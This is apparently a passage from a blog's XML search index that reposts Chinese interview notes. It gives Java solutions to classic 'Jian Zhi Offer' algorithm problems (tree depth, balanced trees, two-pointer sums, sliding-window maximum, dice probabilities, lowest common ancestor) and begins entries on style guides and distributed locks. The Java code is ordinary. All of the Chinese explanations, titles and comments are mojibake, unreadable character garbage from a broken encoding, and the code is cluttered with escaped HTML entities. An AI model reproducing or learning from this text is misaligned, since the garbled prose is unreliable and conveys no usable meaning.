K)&#123; int first = binarySearch(nums, K); int last = binarySearch(nums, K + 1); return (first == nums.length || nums[first] != K) ? 0 : last - first;&#125;private int binarySearch(int[] nums, int K)&#123; int l = 0, h = nums.length; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &gt;= K) h = m; else l = m + 1; &#125; return l;&#125; 54. äºŒå‰æœç´¢æ ‘çš„ç¬¬ K ä¸ªç»“ç‚¹NowCoder è§£é¢˜æ€è·¯åˆ©ç”¨äºŒå‰æœç´¢æ•°ä¸­åºéå†æœ‰åºçš„ç‰¹ç‚¹ã€‚ 12345678910111213141516171819private TreeNode ret;private int cnt = 0;public TreeNode KthNode(TreeNode pRoot, int k)&#123; inOrder(pRoot, k); return ret;&#125;private void inOrder(TreeNode root, int k)&#123; if (root == null || cnt &gt;= k) return; inOrder(root.left, k); cnt++; if (cnt == k) ret = root; inOrder(root.right, k);&#125; 55.1 äºŒå‰æ ‘çš„æ·±åº¦NowCoder é¢˜ç›®æè¿°ä»æ ¹ç»“ç‚¹åˆ°å¶ç»“ç‚¹ä¾æ¬¡ç»è¿‡çš„ç»“ç‚¹ï¼ˆå«æ ¹ã€å¶ç»“ç‚¹ï¼‰å½¢æˆæ ‘çš„ä¸€æ¡è·¯å¾„ï¼Œæœ€é•¿è·¯å¾„çš„é•¿åº¦ä¸ºæ ‘çš„æ·±åº¦ã€‚ è§£é¢˜æ€è·¯1234public int TreeDepth(TreeNode root)&#123; return root == null ? 0 : 1 + Math.max(TreeDepth(root.left), TreeDepth(root.right));&#125; 55.2 å¹³è¡¡äºŒå‰æ ‘NowCoder é¢˜ç›®æè¿°å¹³è¡¡äºŒå‰æ ‘å·¦å³å­æ ‘é«˜åº¦å·®ä¸è¶…è¿‡ 1ã€‚ è§£é¢˜æ€è·¯123456789101112131415161718private boolean isBalanced = true;public boolean IsBalanced_Solution(TreeNode root)&#123; height(root); return isBalanced;&#125;private int height(TreeNode root)&#123; if (root == null || !isBalanced) return 0; int left = height(root.left); int right = height(root.right); if (Math.abs(left - right) &gt; 1) isBalanced = false; return 1 + Math.max(left, right);&#125; 56. æ•°ç»„ä¸­åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—NowCoder é¢˜ç›®æè¿°ä¸€ä¸ªæ•´å‹æ•°ç»„é‡Œé™¤äº†ä¸¤ä¸ªæ•°å­—ä¹‹å¤–ï¼Œå…¶ä»–çš„æ•°å­—éƒ½å‡ºç°äº†ä¸¤æ¬¡ï¼Œæ‰¾å‡ºè¿™ä¸¤ä¸ªæ•°ã€‚ è§£é¢˜æ€è·¯ä¸¤ä¸ªä¸ç›¸ç­‰çš„å…ƒç´ åœ¨ä½çº§è¡¨ç¤ºä¸Šå¿…å®šä¼šæœ‰ä¸€ä½å­˜åœ¨ä¸åŒï¼Œå°†æ•°ç»„çš„æ‰€æœ‰å…ƒç´ å¼‚æˆ–å¾—åˆ°çš„ç»“æœä¸ºä¸å­˜åœ¨é‡å¤çš„ä¸¤ä¸ªå…ƒç´ å¼‚æˆ–çš„ç»“æœã€‚ diff &amp;= -diff å¾—åˆ°å‡º diff æœ€å³ä¾§ä¸ä¸º 0 çš„ä½ï¼Œä¹Ÿå°±æ˜¯ä¸å­˜åœ¨é‡å¤çš„ä¸¤ä¸ªå…ƒç´ åœ¨ä½çº§è¡¨ç¤ºä¸Šæœ€å³ä¾§ä¸åŒçš„é‚£ä¸€ä½ï¼Œåˆ©ç”¨è¿™ä¸€ä½å°±å¯ä»¥å°†ä¸¤ä¸ªå…ƒç´ åŒºåˆ†å¼€æ¥ã€‚ 12345678910111213public void FindNumsAppearOnce(int[] nums, int num1[], int num2[])&#123; int diff = 0; for (int num : nums) diff ^= num; diff &amp;= -diff; for (int num : nums) &#123; if ((num &amp; diff) == 0) num1[0] ^= num; else num2[0] ^= num; &#125;&#125; 57.1 å’Œä¸º S çš„ä¸¤ä¸ªæ•°å­—NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€ä¸ªé€’å¢æ’åºçš„æ•°ç»„å’Œä¸€ä¸ªæ•°å­— Sï¼Œåœ¨æ•°ç»„ä¸­æŸ¥æ‰¾ä¸¤ä¸ªæ•°ï¼Œä½¿å¾—ä»–ä»¬çš„å’Œæ­£å¥½æ˜¯ Sï¼Œå¦‚æœæœ‰å¤šå¯¹æ•°å­—çš„å’Œç­‰äº Sï¼Œè¾“å‡ºä¸¤ä¸ªæ•°çš„ä¹˜ç§¯æœ€å°çš„ã€‚ è§£é¢˜æ€è·¯ä½¿ç”¨åŒæŒ‡é’ˆï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å…ƒç´ è¾ƒå°çš„å€¼ï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å…ƒç´ è¾ƒå¤§çš„å€¼ã€‚æŒ‡å‘è¾ƒå°å…ƒç´ çš„æŒ‡é’ˆä»å¤´å‘å°¾éå†ï¼ŒæŒ‡å‘è¾ƒå¤§å…ƒç´ çš„æŒ‡é’ˆä»å°¾å‘å¤´éå†ã€‚ å¦‚æœä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘å…ƒç´ çš„å’Œ sum == targetï¼Œé‚£ä¹ˆå¾—åˆ°è¦æ±‚çš„ç»“æœï¼› å¦‚æœ sum &gt; targetï¼Œç§»åŠ¨è¾ƒå¤§çš„å…ƒç´ ï¼Œä½¿ sum å˜å°ä¸€äº›ï¼› å¦‚æœ sum &lt; targetï¼Œç§»åŠ¨è¾ƒå°çš„å…ƒç´ ï¼Œä½¿ sum å˜å¤§ä¸€äº›ã€‚ 1234567891011121314public ArrayList&lt;Integer&gt; FindNumbersWithSum(int[] array, int sum)&#123; int i = 0, j = array.length - 1; while (i &lt; j) &#123; int cur = array[i] + array[j]; if (cur == sum) return new ArrayList&lt;&gt;(Arrays.asList(array[i], array[j])); if (cur &lt; sum) i++; else j--; &#125; return new ArrayList&lt;&gt;();&#125; 57.2 å’Œä¸º S çš„è¿ç»­æ­£æ•°åºåˆ—NowCoder é¢˜ç›®æè¿°è¾“å‡ºæ‰€æœ‰å’Œä¸º S çš„è¿ç»­æ­£æ•°åºåˆ—ã€‚ ä¾‹å¦‚å’Œä¸º 100 çš„è¿ç»­åºåˆ—æœ‰ï¼š 12[9, 10, 11, 12, 13, 14, 15, 16][18, 19, 20, 21, 22]ã€‚ è§£é¢˜æ€è·¯12345678910111213141516171819202122232425public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindContinuousSequence(int sum)&#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;(); int start = 1, end = 2; int curSum = 3; while (end &lt; sum) &#123; if (curSum &gt; sum) &#123; curSum -= start; start++; &#125; else if (curSum &lt; sum) &#123; end++; curSum += end; &#125; else &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = start; i &lt;= end; i++) list.add(i); ret.add(list); curSum -= start; start++; end++; curSum += end; &#125; &#125; return ret;&#125; 58.1 ç¿»è½¬å•è¯é¡ºåºåˆ—NowCoder é¢˜ç›®æè¿°è¾“å…¥ï¼šâ€I am a student.â€ è¾“å‡ºï¼šâ€student. a am Iâ€ è§£é¢˜æ€è·¯é¢˜ç›®åº”è¯¥æœ‰ä¸€ä¸ªéšå«æ¡ä»¶ï¼Œå°±æ˜¯ä¸èƒ½ç”¨é¢å¤–çš„ç©ºé—´ã€‚è™½ç„¶ Java çš„é¢˜ç›®è¾“å…¥å‚æ•°ä¸º String ç±»å‹ï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªå­—ç¬¦æ•°ç»„ä½¿å¾—ç©ºé—´å¤æ‚åº¦ä¸º O(N)ï¼Œä½†æ˜¯æ­£ç¡®çš„å‚æ•°ç±»å‹åº”è¯¥å’ŒåŸä¹¦ä¸€æ ·ï¼Œä¸ºå­—ç¬¦æ•°ç»„ï¼Œå¹¶ä¸”åªèƒ½ä½¿ç”¨è¯¥å­—ç¬¦æ•°ç»„çš„ç©ºé—´ã€‚ä»»ä½•ä½¿ç”¨äº†é¢å¤–ç©ºé—´çš„è§£æ³•åœ¨é¢è¯•æ—¶éƒ½ä¼šå¤§æ‰“æŠ˜æ‰£ï¼ŒåŒ…æ‹¬é€’å½’è§£æ³•ã€‚ æ­£ç¡®çš„è§£æ³•åº”è¯¥æ˜¯å’Œä¹¦ä¸Šä¸€æ ·ï¼Œå…ˆæ—‹è½¬æ¯ä¸ªå•è¯ï¼Œå†æ—‹è½¬æ•´ä¸ªå­—ç¬¦ä¸²ã€‚ 12345678910111213141516171819202122232425262728public String ReverseSentence(String str)&#123; int n = str.length(); char[] chars = str.toCharArray(); int i = 0, j = 0; while (j &lt;= n) &#123; if (j == n || chars[j] == ' ') &#123; reverse(chars, i, j - 1); i = j + 1; &#125; j++; &#125; reverse(chars, 0, n - 1); return new String(chars);&#125;private void reverse(char[] c, int i, int j)&#123; while (i &lt; j) swap(c, i++, j--);&#125;private void swap(char[] c, int i, int j)&#123; char t = c[i]; c[i] = c[j]; c[j] = t;&#125; 58.2 å·¦æ—‹è½¬å­—ç¬¦ä¸²NowCoder é¢˜ç›®æè¿°å¯¹äºä¸€ä¸ªç»™å®šçš„å­—ç¬¦åºåˆ— Sï¼Œè¯·ä½ æŠŠå…¶å¾ªç¯å·¦ç§» K ä½åçš„åºåˆ—è¾“å‡ºã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦åºåˆ— S=â€abcXYZdefâ€, è¦æ±‚è¾“å‡ºå¾ªç¯å·¦ç§» 3 ä½åçš„ç»“æœï¼Œå³â€œXYZdefabcâ€ã€‚ è§£é¢˜æ€è·¯å°† â€œabcXYZdefâ€ æ—‹è½¬å·¦ç§»ä¸‰ä½ï¼Œå¯ä»¥å…ˆå°† â€œabcâ€ å’Œ â€œXYZdefâ€ åˆ†åˆ«æ—‹è½¬ï¼Œå¾—åˆ° â€œcbafedZYXâ€ï¼Œç„¶åå†æŠŠæ•´ä¸ªå­—ç¬¦ä¸²æ—‹è½¬å¾—åˆ° â€œXYZdefabcâ€ã€‚ 1234567891011121314151617181920212223public String LeftRotateString(String str, int n)&#123; if (n &gt;= str.length()) return str; char[] chars = str.toCharArray(); reverse(chars, 0, n - 1); reverse(chars, n, chars.length - 1); reverse(chars, 0, chars.length - 1); return new String(chars);&#125;private void reverse(char[] chars, int i, int j)&#123; while (i &lt; j) swap(chars, i++, j--);&#125;private void swap(char[] chars, int i, int j)&#123; char t = chars[i]; chars[i] = chars[j]; chars[j] = t;&#125; 59. æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼NowCoder é¢˜ç›®æè¿°ç»™å®šä¸€ä¸ªæ•°ç»„å’Œæ»‘åŠ¨çª—å£çš„å¤§å°ï¼Œæ‰¾å‡ºæ‰€æœ‰æ»‘åŠ¨çª—å£é‡Œæ•°å€¼çš„æœ€å¤§å€¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥æ•°ç»„ {2, 3, 4, 2, 6, 2, 5, 1} åŠæ»‘åŠ¨çª—å£çš„å¤§å° 3ï¼Œé‚£ä¹ˆä¸€å…±å­˜åœ¨ 6 ä¸ªæ»‘åŠ¨çª—å£ï¼Œä»–ä»¬çš„æœ€å¤§å€¼åˆ†åˆ«ä¸º {4, 4, 6, 6, 6, 5}ã€‚ è§£é¢˜æ€è·¯12345678910111213141516public ArrayList&lt;Integer&gt; maxInWindows(int[] num, int size)&#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (size &gt; num.length || size &lt; 1) return ret; PriorityQueue&lt;Integer&gt; heap = new PriorityQueue&lt;&gt;((o1, o2) -&gt; o2 - o1); /* å¤§é¡¶å † */ for (int i = 0; i &lt; size; i++) heap.add(num[i]); ret.add(heap.peek()); for (int i = 1, j = i + size - 1; j &lt; num.length; i++, j++) &#123; /* ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º size çš„å¤§é¡¶å † */ heap.remove(num[i - 1]); heap.add(num[j]); ret.add(heap.peek()); &#125; return ret;&#125; 60. n ä¸ªéª°å­çš„ç‚¹æ•°Lintcode é¢˜ç›®æè¿°æŠŠ n ä¸ªéª°å­ä»åœ¨åœ°ä¸Šï¼Œæ±‚ç‚¹æ•°å’Œä¸º s çš„æ¦‚ç‡ã€‚ è§£é¢˜æ€è·¯åŠ¨æ€è§„åˆ’è§£æ³•ä½¿ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„ dp å­˜å‚¨ç‚¹æ•°å‡ºç°çš„æ¬¡æ•°ï¼Œå…¶ä¸­ dp[i][j] è¡¨ç¤ºå‰ i ä¸ªéª°å­äº§ç”Ÿç‚¹æ•° j çš„æ¬¡æ•°ã€‚ ç©ºé—´å¤æ‚åº¦ï¼šO(N2) 123456789101112131415161718192021public List&lt;Map.Entry&lt;Integer, Double&gt;&gt; dicesSum(int n)&#123; final int face = 6; final int pointNum = face * n; long[][] dp = new long[n + 1][pointNum + 1]; for (int i = 1; i &lt;= face; i++) dp[1][i] = 1; for (int i = 2; i &lt;= n; i++) for (int j = i; j &lt;= pointNum; j++) /* ä½¿ç”¨ i ä¸ªéª°å­æœ€å°ç‚¹æ•°ä¸º i */ for (int k = 1; k &lt;= face &amp;&amp; k &lt;= j; k++) dp[i][j] += dp[i - 1][j - k]; final double totalNum = Math.pow(6, n); List&lt;Map.Entry&lt;Integer, Double&gt;&gt; ret = new ArrayList&lt;&gt;(); for (int i = n; i &lt;= pointNum; i++) ret.add(new AbstractMap.SimpleEntry&lt;&gt;(i, dp[n][i] / totalNum)); return ret;&#125; åŠ¨æ€è§„åˆ’è§£æ³• + æ—‹è½¬æ•°ç»„ç©ºé—´å¤æ‚åº¦ï¼šO(N) 1234567891011121314151617181920212223242526public List&lt;Map.Entry&lt;Integer, Double&gt;&gt; dicesSum(int n)&#123; final int face = 6; final int pointNum = face * n; long[][] dp = new long[2][pointNum + 1]; for (int i = 1; i &lt;= face; i++) dp[0][i] = 1; int flag = 1; /* æ—‹è½¬æ ‡è®° */ for (int i = 2; i &lt;= n; i++, flag = 1 - flag) &#123; for (int j = 0; j &lt;= pointNum; j++) dp[flag][j] = 0; /* æ—‹è½¬æ•°ç»„æ¸…é›¶ */ for (int j = i; j &lt;= pointNum; j++) for (int k = 1; k &lt;= face &amp;&amp; k &lt;= j; k++) dp[flag][j] += dp[1 - flag][j - k]; &#125; final double totalNum = Math.pow(6, n); List&lt;Map.Entry&lt;Integer, Double&gt;&gt; ret = new ArrayList&lt;&gt;(); for (int i = n; i &lt;= pointNum; i++) ret.add(new AbstractMap.SimpleEntry&lt;&gt;(i, dp[1 - flag][i] / totalNum)); return ret;&#125; 61. æ‰‘å…‹ç‰Œé¡ºå­NowCoder é¢˜ç›®æè¿°äº”å¼ ç‰Œï¼Œå…¶ä¸­å¤§å°é¬¼ä¸ºç™å­ï¼Œç‰Œé¢å¤§å°ä¸º 0ã€‚åˆ¤æ–­æ˜¯å¦èƒ½ç»„æˆé¡ºå­ã€‚ è§£é¢˜æ€è·¯1234567891011121314151617public boolean isContinuous(int[] nums)&#123; if (nums.length &lt; 5) return false; Arrays.sort(nums); int cnt = 0; for (int num : nums) /* ç»Ÿè®¡ç™å­æ•°é‡ */ if (num == 0) cnt++; for (int i = cnt; i &lt; nums.length - 1; i++) &#123; if (nums[i + 1] == nums[i]) return false; cnt -= nums[i + 1] - nums[i] - 1; /* ä½¿ç”¨ç™å­å»è¡¥å…¨ä¸è¿ç»­çš„é¡ºå­ */ &#125; return cnt &gt;= 0;&#125; 62. åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°NowCoder é¢˜ç›®æè¿°è®©å°æœ‹å‹ä»¬å›´æˆä¸€ä¸ªå¤§åœˆã€‚ç„¶åï¼Œä»–éšæœºæŒ‡å®šä¸€ä¸ªæ•° mï¼Œè®©ç¼–å·ä¸º 0 çš„å°æœ‹å‹å¼€å§‹æŠ¥æ•°ã€‚æ¯æ¬¡å–Šåˆ° m-1 çš„é‚£ä¸ªå°æœ‹å‹è¦å‡ºåˆ—å”±é¦–æ­Œï¼Œç„¶åå¯ä»¥åœ¨ç¤¼å“ç®±ä¸­ä»»æ„çš„æŒ‘é€‰ç¤¼ç‰©ï¼Œå¹¶ä¸”ä¸å†å›åˆ°åœˆä¸­ï¼Œä»ä»–çš„ä¸‹ä¸€ä¸ªå°æœ‹å‹å¼€å§‹ï¼Œç»§ç»­ 0â€¦m-1 æŠ¥æ•° â€¦. è¿™æ ·ä¸‹å» â€¦. ç›´åˆ°å‰©ä¸‹æœ€åä¸€ä¸ªå°æœ‹å‹ï¼Œå¯ä»¥ä¸ç”¨è¡¨æ¼”ã€‚ è§£é¢˜æ€è·¯çº¦ç‘Ÿå¤«ç¯ï¼Œåœ†åœˆé•¿åº¦ä¸º n çš„è§£å¯ä»¥çœ‹æˆé•¿åº¦ä¸º n-1 çš„è§£å†åŠ ä¸ŠæŠ¥æ•°çš„é•¿åº¦ mã€‚å› ä¸ºæ˜¯åœ†åœˆï¼Œæ‰€ä»¥æœ€åéœ€è¦å¯¹ n å–ä½™ã€‚ 12345678public int LastRemaining_Solution(int n, int m)&#123; if (n == 0) /* ç‰¹æ®Šè¾“å…¥çš„å¤„ç† */ return -1; if (n == 1) /* è¿”å›æ¡ä»¶ */ return 0; return (LastRemaining_Solution(n - 1, m) + m) % n;&#125; 63. è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦Leetcode é¢˜ç›®æè¿°å¯ä»¥æœ‰ä¸€æ¬¡ä¹°å…¥å’Œä¸€æ¬¡å–å‡ºï¼Œä¹°å…¥å¿…é¡»åœ¨å‰ã€‚æ±‚æœ€å¤§æ”¶ç›Šã€‚ è§£é¢˜æ€è·¯ä½¿ç”¨è´ªå¿ƒç­–ç•¥ï¼Œå‡è®¾ç¬¬ i è½®è¿›è¡Œå–å‡ºæ“ä½œï¼Œä¹°å…¥æ“ä½œä»·æ ¼åº”è¯¥åœ¨ i ä¹‹å‰å¹¶ä¸”ä»·æ ¼æœ€ä½ã€‚ 123456789101112public int maxProfit(int[] prices)&#123; if (prices == null || prices.length == 0) return 0; int soFarMin = prices[0]; int maxProfit = 0; for (int i = 1; i &lt; prices.length; i++) &#123; soFarMin = Math.min(soFarMin, prices[i]); maxProfit = Math.max(maxProfit, prices[i] - soFarMin); &#125; return maxProfit;&#125; 64. æ±‚ 1+2+3+â€¦+nNowCoder é¢˜ç›®æè¿°æ±‚ 1+2+3+â€¦+nï¼Œè¦æ±‚ä¸èƒ½ä½¿ç”¨ä¹˜é™¤æ³•ã€forã€whileã€ifã€elseã€switchã€case ç­‰å…³é”®å­—åŠæ¡ä»¶åˆ¤æ–­è¯­å¥ï¼ˆA?B:Cï¼‰ã€‚ è§£é¢˜æ€è·¯ä½¿ç”¨é€’å½’è§£æ³•æœ€é‡è¦çš„æ˜¯æŒ‡å®šè¿”å›æ¡ä»¶ï¼Œä½†æ˜¯æœ¬é¢˜æ— æ³•ç›´æ¥ä½¿ç”¨ if è¯­å¥æ¥æŒ‡å®šè¿”å›æ¡ä»¶ã€‚ æ¡ä»¶ä¸ &amp;&amp; å…·æœ‰çŸ­è·¯åŸåˆ™ï¼Œå³åœ¨ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥ä¸º false çš„æƒ…å†µä¸‹ä¸ä¼šå»æ‰§è¡Œç¬¬äºŒä¸ªæ¡ä»¶è¯­å¥ã€‚åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œå°†é€’å½’çš„è¿”å›æ¡ä»¶å–éç„¶åä½œä¸º &amp;&amp; çš„ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥ï¼Œé€’å½’çš„ä¸»ä½“è½¬æ¢ä¸ºç¬¬äºŒä¸ªæ¡ä»¶è¯­å¥ï¼Œé‚£ä¹ˆå½“é€’å½’çš„è¿”å›æ¡ä»¶ä¸º true çš„æƒ…å†µä¸‹å°±ä¸ä¼šæ‰§è¡Œé€’å½’çš„ä¸»ä½“éƒ¨åˆ†ï¼Œé€’å½’è¿”å›ã€‚ ä»¥ä¸‹å®ç°ä¸­ï¼Œé€’å½’çš„è¿”å›æ¡ä»¶ä¸º n &lt;= 0ï¼Œå–éåå°±æ˜¯ n &gt; 0ï¼Œé€’å½’çš„ä¸»ä½“éƒ¨åˆ†ä¸º sum += Sum_Solution(n - 1)ï¼Œè½¬æ¢ä¸ºæ¡ä»¶è¯­å¥åå°±æ˜¯ (sum += Sum_Solution(n - 1)) &gt; 0ã€‚ 123456public int Sum_Solution(int n)&#123; int sum = n; boolean b = (n &gt; 0) &amp;&amp; ((sum += Sum_Solution(n - 1)) &gt; 0); return sum;&#125; 65. ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³•NowCoder é¢˜ç›®æè¿°å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ä¸¤ä¸ªæ•´æ•°ä¹‹å’Œï¼Œè¦æ±‚åœ¨å‡½æ•°ä½“å†…ä¸å¾—ä½¿ç”¨ +ã€-ã€*ã€/ å››åˆ™è¿ç®—ç¬¦å·ã€‚ è§£é¢˜æ€è·¯a ^ b è¡¨ç¤ºæ²¡æœ‰è€ƒè™‘è¿›ä½çš„æƒ…å†µä¸‹ä¸¤æ•°çš„å’Œï¼Œ(a &amp; b) &lt;&lt; 1 å°±æ˜¯è¿›ä½ã€‚ é€’å½’ä¼šç»ˆæ­¢çš„åŸå› æ˜¯ (a &amp; b) &lt;&lt; 1 æœ€å³è¾¹ä¼šå¤šä¸€ä¸ª 0ï¼Œé‚£ä¹ˆç»§ç»­é€’å½’ï¼Œè¿›ä½æœ€å³è¾¹çš„ 0 ä¼šæ…¢æ…¢å¢å¤šï¼Œæœ€åè¿›ä½ä¼šå˜ä¸º 0ï¼Œé€’å½’ç»ˆæ­¢ã€‚ 1234public int Add(int a, int b)&#123; return b == 0 ? a : Add(a ^ b, (a &amp; b) &lt;&lt; 1);&#125; 66. æ„å»ºä¹˜ç§¯æ•°ç»„NowCoder é¢˜ç›®æè¿°ç»™å®šä¸€ä¸ªæ•°ç»„ A[0, 1,â€¦, n-1], è¯·æ„å»ºä¸€ä¸ªæ•°ç»„ B[0, 1,â€¦, n-1], å…¶ä¸­ B ä¸­çš„å…ƒç´  B[i]=A[0]*A[1]*â€¦*A[i-1]*A[i+1]*â€¦*A[n-1]ã€‚ä¸èƒ½ä½¿ç”¨é™¤æ³•ã€‚ è§£é¢˜æ€è·¯12345678910public int[] multiply(int[] A)&#123; int n = A.length; int[] B = new int[n]; for (int i = 0, product = 1; i &lt; n; product *= A[i], i++) /* ä»å·¦å¾€å³ç´¯ä¹˜ */ B[i] = product; for (int i = n - 1, product = 1; i &gt;= 0; product *= A[i], i--) /* ä»å³å¾€å·¦ç´¯ä¹˜ */ B[i] *= product; return B;&#125; 67. æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°NowCoder é¢˜ç›®æè¿°å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆä¸€ä¸ªæ•´æ•°ï¼Œè¦æ±‚ä¸èƒ½ä½¿ç”¨å­—ç¬¦ä¸²è½¬æ¢æ•´æ•°çš„åº“å‡½æ•°ã€‚ æ•°å€¼ä¸º 0 æˆ–è€…å­—ç¬¦ä¸²ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„æ•°å€¼åˆ™è¿”å› 0ã€‚ 1234567Iuput:+21474836471a33Output:21474836470 è§£é¢˜æ€è·¯12345678910111213141516public int StrToInt(String str)&#123; if (str == null || str.length() == 0) return 0; boolean isNegative = str.charAt(0) == '-'; int ret = 0; for (int i = 0; i &lt; str.length(); i++) &#123; char c = str.charAt(i); if (i == 0 &amp;&amp; (c == '+' || c == '-')) /* ç¬¦å·åˆ¤å®š */ continue; if (c &lt; '0' || c &gt; '9') /* éæ³•è¾“å…¥ */ return 0; ret = ret * 10 + (c - '0'); &#125; return isNegative ? -ret : ret;&#125; 68. æ ‘ä¸­ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆè§£é¢˜æ€è·¯äºŒå‰æŸ¥æ‰¾æ ‘ Leetcode : 235. Lowest Common Ancestor of a Binary Search Tree äºŒå‰æŸ¥æ‰¾æ ‘ä¸­ï¼Œä¸¤ä¸ªèŠ‚ç‚¹ p, q çš„å…¬å…±ç¥–å…ˆ root æ»¡è¶³ root.val &gt;= p.val &amp;&amp; root.val &lt;= q.valã€‚ 123456789public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root == null) return root; if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val) return lowestCommonAncestor(root.left, p, q); if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) return lowestCommonAncestor(root.right, p, q); return root;&#125; æ™®é€šäºŒå‰æ ‘ Leetcode : 236. Lowest Common Ancestor of a Binary Tree åœ¨å·¦å³å­æ ‘ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ p æˆ–è€… qï¼Œå¦‚æœ p å’Œ q åˆ†åˆ«åœ¨ä¸¤ä¸ªå­æ ‘ä¸­ï¼Œé‚£ä¹ˆå°±è¯´æ˜æ ¹èŠ‚ç‚¹å°±æ˜¯ LCAã€‚ 1234567public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root;&#125; å‚è€ƒæ–‡çŒ® ä½•æµ·æ¶›. å‰‘æŒ‡ Offer[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2012.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä»£ç é£æ ¼è§„èŒƒ]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E8%A7%84%E8%8C%83%2F</url>
    <content type="text"><![CDATA[Twitter Java Style Guide Google Java Style Guide]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åˆ†å¸ƒå¼é—®é¢˜åˆ†æ]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E5%88%86%E5%B8%83%E5%BC%8F%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ä¸€ã€åˆ†å¸ƒå¼é” æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼• Redis çš„ SETNX æŒ‡ä»¤ Redis çš„ RedLock ç®—æ³• Zookeeper çš„æœ‰åºèŠ‚ç‚¹ äºŒã€åˆ†å¸ƒå¼äº‹åŠ¡ æœ¬åœ°æ¶ˆæ¯è¡¨ ä¸¤é˜¶æ®µæäº¤åè®® ä¸‰ã€åˆ†å¸ƒå¼ Session Sticky Sessions Session Replication Session Server å››ã€è´Ÿè½½å‡è¡¡ ç®—æ³• å®ç° ä¸€ã€åˆ†å¸ƒå¼é”åœ¨å•æœºåœºæ™¯ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ Java æä¾›çš„å†…ç½®é”æ¥å®ç°è¿›ç¨‹åŒæ­¥ã€‚ä½†æ˜¯åœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ï¼Œéœ€è¦åŒæ­¥çš„è¿›ç¨‹å¯èƒ½ä½äºä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼é”ã€‚ é˜»å¡é”é€šå¸¸ä½¿ç”¨äº’æ–¥é‡æ¥å®ç°ï¼Œäº’æ–¥é‡ä¸º 1 è¡¨ç¤ºæœ‰å…¶å®ƒè¿›ç¨‹åœ¨ä½¿ç”¨é”ï¼Œæ­¤æ—¶å¤„äºé”å®šçŠ¶æ€ï¼Œäº’æ–¥é‡ä¸º 0 è¡¨ç¤ºæœªé”å®šçŠ¶æ€ã€‚1 å’Œ 0 å¯ä»¥ç”¨ä¸€ä¸ªæ•´å‹å€¼æ¥å­˜å‚¨ï¼Œä¹Ÿå¯ä»¥ç”¨æŸä¸ªæ•°æ®å­˜åœ¨æˆ–è€…ä¸å­˜åœ¨æ¥å­˜å‚¨ï¼ŒæŸä¸ªæ•°æ®å­˜åœ¨è¡¨ç¤ºäº’æ–¥é‡ä¸º 1ã€‚ æ•°æ®åº“çš„å”¯ä¸€ç´¢å¼•å½“æƒ³è¦è·å¾—é”æ—¶ï¼Œå°±å‘è¡¨ä¸­æ’å…¥ä¸€æ¡è®°å½•ï¼Œé‡Šæ”¾é”æ—¶å°±åˆ é™¤è¿™æ¡è®°å½•ã€‚å”¯ä¸€ç´¢å¼•å¯ä»¥ä¿è¯è¯¥è®°å½•åªè¢«æ’å…¥ä¸€æ¬¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨è¿™ä¸ªè®°å½•æ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å­˜äºé”å®šçŠ¶æ€ã€‚ å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š 